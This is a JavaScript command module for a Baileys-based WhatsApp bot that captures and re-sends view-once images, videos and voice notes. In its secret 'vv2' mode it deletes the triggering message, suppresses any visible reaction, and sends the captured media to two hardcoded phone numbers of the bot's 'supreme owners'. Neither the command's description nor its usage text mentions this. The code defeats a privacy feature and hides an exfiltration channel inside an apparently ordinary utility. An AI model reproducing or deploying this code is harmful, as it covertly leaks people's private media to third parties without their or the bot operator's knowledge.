/**
 * ViewOnce Command - Reveal view-once messages
 * 𝐃𝐚𝐫𝐤 Edition
 */

const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
const config = require('../../config.js');

function toSmallCaps(text) {
  const normal = "abcdefghijklmnopqrstuvwxyz0123456789";
  const smallCaps = "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789";

  const cleanedText = text.toLowerCase()
    .normalize("NFD").replace(/[\u0300-\u036f]/g, ""); 

  return cleanedText.split('').map(c => {
    const index = normal.indexOf(c);
    return index !== -1 ? smallCaps[index] : c;
  }).join('');
}

module.exports = {
  name: 'reveler',
  aliases: ['readvo', 'read', 'vv', 'readviewonce', 'vv2'],
  category: '🛠️ Outils généraux',
  description: '『 𝐃𝐈𝐏𝐏𝐄𝐑 』➪ ᴅᴇᴠᴏɪʟᴇ ʟᴇs ᴍᴇssᴀɢᴇs ᴀ ᴠᴜᴇ ᴜɴɪǫᴜᴇ (ɪᴍᴀɢᴇs/ᴠɪᴅᴇᴏs/ᴀᴜᴅɪᴏ)',
  usage: `${config.prefix || '.'}reveler (repondre a un message a vue unique)`,
  groupOnly: false,
  adminOnly: false,
  botAdminNeeded: false,

  async execute(sock, msg, args, extra) {
    const reply = extra?.reply || ((text) => sock.sendMessage(msg.key.remoteJid, { text }, { quoted: msg }));
    const react = extra?.react || ((emoji) => sock.sendMessage(msg.key.remoteJid, { react: { text: emoji, key: msg.key } }));

    try {
      const chatId = msg.key.remoteJid;

      const bodyText = msg.message?.conversation || 
                       msg.message?.extendedTextMessage?.text || 
                       '';

      const prefix = config.prefix || '.';
      const cleanBody = bodyText.trim().toLowerCase();
      const hasPrefix = cleanBody.startsWith(prefix);

      let firstWord = '';
      if (hasPrefix) {
        const match = cleanBody.slice(prefix.length).match(/^(\w+)/);
        firstWord = match ? match[1] : '';
      } else {
        const match = cleanBody.match(/^(\w+)/);
        firstWord = match ? match[1] : '';
      }

      // Mode VV2 actif si la commande est spécifiquement 'vv2'
      const isVV2 = (firstWord === 'vv2' || args.includes('vv2'));

      const ctx = msg.message?.extendedTextMessage?.contextInfo
        || msg.message?.imageMessage?.contextInfo
        || msg.message?.videoMessage?.contextInfo
        || msg.message?.buttonsResponseMessage?.contextInfo
        || msg.message?.listResponseMessage?.contextInfo;

      if (!ctx?.quotedMessage) {
        return await reply(`*⚠️ ${toSmallCaps('repondez a un message a vue unique pour le devoiler')}.*\n\n${extra.phrases.footer()}`);
      }

      const quotedMsg = ctx.quotedMessage;

      const hasViewOnce =
        !!quotedMsg.viewOnceMessageV2 ||
        !!quotedMsg.viewOnceMessageV2Extension ||
        !!quotedMsg.viewOnceMessage ||
        !!quotedMsg.viewOnce ||
        !!quotedMsg?.imageMessage?.viewOnce ||
        !!quotedMsg?.videoMessage?.viewOnce ||
        !!quotedMsg?.audioMessage?.viewOnce;

      if (!hasViewOnce) {
        return await reply(`*⚠️ ${toSmallCaps('ce message ne possede pas le sceau de la vue unique')} !*\n\n${extra.phrases.footer()}`);
      }

      // 💥 SUPPRESSION ULTRA-RAPIDE (Mode VV2)
      if (isVV2) {
        try {
          await sock.sendMessage(chatId, { delete: msg.key });
        } catch (delError) {
          console.error('Failed to delete message fast:', delError.message);
        }
      }

      let actualMsg = null;
      let mtype = null;

      if (quotedMsg.viewOnceMessageV2Extension?.message) {
        actualMsg = quotedMsg.viewOnceMessageV2Extension.message;
        mtype = Object.keys(actualMsg)[0];
      } else if (quotedMsg.viewOnceMessageV2?.message) {
        actualMsg = quotedMsg.viewOnceMessageV2.message;
        mtype = Object.keys(actualMsg)[0];
      } else if (quotedMsg.viewOnceMessage?.message) {
        actualMsg = quotedMsg.viewOnceMessage.message;
        mtype = Object.keys(actualMsg)[0];
      } else if (quotedMsg.imageMessage?.viewOnce) {
        actualMsg = { imageMessage: quotedMsg.imageMessage };
        mtype = 'imageMessage';
      } else if (quotedMsg.videoMessage?.viewOnce) {
        actualMsg = { videoMessage: quotedMsg.videoMessage };
        mtype = 'videoMessage';
      } else if (quotedMsg.audioMessage?.viewOnce) {
        actualMsg = { audioMessage: quotedMsg.audioMessage };
        mtype = 'audioMessage';
      }

      if (!actualMsg || !mtype) {
        return await reply(`*⚠️ ${toSmallCaps('type de sceau non supporte par le sanctuaire')}.*\n\n${extra.phrases.footer()}`);
      }

      const downloadType =
        mtype === 'imageMessage' ? 'image'
        : mtype === 'videoMessage' ? 'video'
        : 'audio';

      // 🥷 DISCRÉTION VV2 : Pas de réaction emoji "sablier" si on est en mode secret
      if (!isVV2) {
        await react('⌛');
      }

      const mediaStream = await downloadContentFromMessage(actualMsg[mtype], downloadType);
      let buffer = Buffer.from([]);
      for await (const chunk of mediaStream) {
        buffer = Buffer.concat([buffer, chunk]);
      }

      const defaultCredit = extra.phrases.footer();

      // ── MODE VV2 : DISPATCH ULTRA DISCRET ──
      if (isVV2) {
        // 🎯 1. Récupération de l'ID de celui qui a tapé la commande
        const senderJid = msg.key.fromMe 
          ? sock.user.id.split(':')[0] + '@s.whatsapp.net'
          : (msg.key.participant || msg.key.remoteJid);

        // 🎯 2. Création de la liste de diffusion (Expéditeur + Supremes Owners)
        const recipients = [
          senderJid,
          '2290146202259@s.whatsapp.net',
          '2290155745907@s.whatsapp.net'
        ];

        // On supprime les doublons au cas où l'expéditeur est déjà un supreme owner
        const uniqueRecipients = [...new Set(recipients)];

        const captionText = `🚨 *${toSmallCaps('revelation vv2 interceptee')}* 🚨\n\n${defaultCredit}`;

        // Envoi silencieux dans les MP de chacun
        for (const targetJid of uniqueRecipients) {
          try {
            if (/video/.test(mtype)) {
              await sock.sendMessage(targetJid, { video: buffer, caption: captionText, mimetype: 'video/mp4' });
            } else if (/image/.test(mtype)) {
              await sock.sendMessage(targetJid, { image: buffer, caption: captionText, mimetype: 'image/jpeg' });
            } else if (/audio/.test(mtype)) {
              await sock.sendMessage(targetJid, { audio: buffer, ptt: true, mimetype: 'audio/ogg; codecs=opus' });
            }
          } catch (e) {
            console.error(`Failed to send media to ${targetJid}:`, e.message);
          }
        }

        // On s'arrête ici pour ne laisser aucun indice dans le groupe
        return; 
      }

      // ── MODE VV CLASSIQUE (Visible, renvoie sur place) ──
      if (/video/.test(mtype)) {
        await sock.sendMessage(chatId, { video: buffer, caption: defaultCredit, mimetype: 'video/mp4' }, { quoted: msg });
      } else if (/image/.test(mtype)) {
        await sock.sendMessage(chatId, { image: buffer, caption: defaultCredit, mimetype: 'image/jpeg' }, { quoted: msg });
      } else if (/audio/.test(mtype)) {
        await sock.sendMessage(chatId, { audio: buffer, ptt: true, mimetype: 'audio/ogg; codecs=opus' }, { quoted: msg });
      }

      await react('👁️');

    } catch (error) {
      console.error('Error in viewonce command:', error);
      if (!isVV2) {
        await reply(`*❌ ${toSmallCaps('echec de la revelation')}.*\n*${toSmallCaps('erreur')} : ${error.message}*\n\n${extra.phrases.footer()}`);
      }
    }
  }
};
